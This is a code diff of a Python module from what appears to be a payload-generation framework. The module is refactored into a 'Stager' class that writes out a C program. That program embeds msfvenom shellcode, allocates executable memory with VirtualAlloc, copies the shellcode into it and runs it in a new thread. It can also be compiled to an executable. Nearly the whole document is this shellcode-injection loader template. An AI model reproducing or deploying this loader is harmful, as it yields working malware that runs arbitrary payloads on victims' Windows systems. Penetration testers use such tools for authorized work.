@@ -1,44 +1,65 @@
-# Discovered code and adapted from:
-# http://www.debasish.in/2012/08/experiment-with-run-time.html
+"""
 
-# Import modules
-import os
-import string
-from modules.auxiliary import shellcode
-from modules.common import randomizer
+C version of the VirtualAlloc pattern invoker.
+
+Code adapted from:
+http://www.debasish.in/2012/08/experiment-with-run-time.html
+
+
+module by @christruncer
+
+"""
+
+
+from modules.common import shellcode
 from modules.common import messages
-from modules.common import csupport
+from modules.common import randomizer
+from modules.common import crypters
+from modules.common import encryption
 
-# C Based void pointer
-def cVirtualAlloc ():
-    # Generate Shellcode Using msfvenom
-    Shellcode = shellcode.genShellcode()
 
-    # Generate Random Variable Names
-    RandShellcode = randomizer.randomString()
-    RandReverseShell = randomizer.randomString()
-    RandMemoryShell = randomizer.randomString()
+class Stager:
+	
+	def __init__(self):
+		# required options
+		self.shortname = "VirtualAlloc"
+		self.description = "C VirtualAlloc method for inline shellcode injection"
+		self.language = "c"
+		self.rating = "Poor"
+		self.extension = "c"
+		
+		# optional
+		self.shellcode = shellcode.Shellcode()
+		# options we require user ineraction for- format is {Option : [Value, Description]]}
+		self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"]}
 
-    # Start creating our C payload
-    PayloadFile = open('payload.c', 'w')
-    PayloadFile.write('#include <windows.h>\n')
-    PayloadFile.write('#include <stdio.h>\n')
-    PayloadFile.write('#include <string.h>\n')
-    PayloadFile.write('int main()\n')
-    PayloadFile.write('{\n')
-    PayloadFile.write('    LPVOID lpvAddr;\n')
-    PayloadFile.write('    HANDLE hHand;\n')
-    PayloadFile.write('    DWORD dwWaitResult;\n')
-    PayloadFile.write('    DWORD threadID;\n\n')
-    PayloadFile.write('unsigned char buff[] = \n')
-    PayloadFile.write('\"' + Shellcode + '\";\n\n')
-    PayloadFile.write('lpvAddr = VirtualAlloc(NULL, strlen(buff),0x3000,0x40);\n')
-    PayloadFile.write('RtlMoveMemory(lpvAddr,buff, strlen(buff));\n')
-    PayloadFile.write('hHand = CreateThread(NULL,0,lpvAddr,NULL,0,&threadID);\n')
-    PayloadFile.write('dwWaitResult = WaitForSingleObject(hHand,INFINITE);\n')
-    PayloadFile.write('return 0;\n')
-    PayloadFile.write('}')
-    PayloadFile.close()
+	def generate(self):
+		
+		# Generate Shellcode Using msfvenom
+		Shellcode = self.shellcode.generate()
+		
+		# Generate Random Variable Names
+		RandShellcode = randomizer.randomString()
+		RandReverseShell = randomizer.randomString()
+		RandMemoryShell = randomizer.randomString()
 
-    # Compile our C code
-    csupport.compilemingw()
+		# Start creating our C payload
+		PayloadCode = '#include <windows.h>\n'
+		PayloadCode += '#include <stdio.h>\n'
+		PayloadCode += '#include <string.h>\n'
+		PayloadCode += 'int main()\n'
+		PayloadCode += '{\n'
+		PayloadCode += '    LPVOID lpvAddr;\n'
+		PayloadCode += '    HANDLE hHand;\n'
+		PayloadCode += '    DWORD dwWaitResult;\n'
+		PayloadCode += '    DWORD threadID;\n\n'
+		PayloadCode += 'unsigned char buff[] = \n'
+		PayloadCode += '\"' + Shellcode + '\";\n\n'
+		PayloadCode += 'lpvAddr = VirtualAlloc(NULL, strlen(buff),0x3000,0x40);\n'
+		PayloadCode += 'RtlMoveMemory(lpvAddr,buff, strlen(buff));\n'
+		PayloadCode += 'hHand = CreateThread(NULL,0,lpvAddr,NULL,0,&threadID);\n'
+		PayloadCode += 'dwWaitResult = WaitForSingleObject(hHand,INFINITE);\n'
+		PayloadCode += 'return 0;\n'
+		PayloadCode += '}\n'
+
+		return PayloadCode
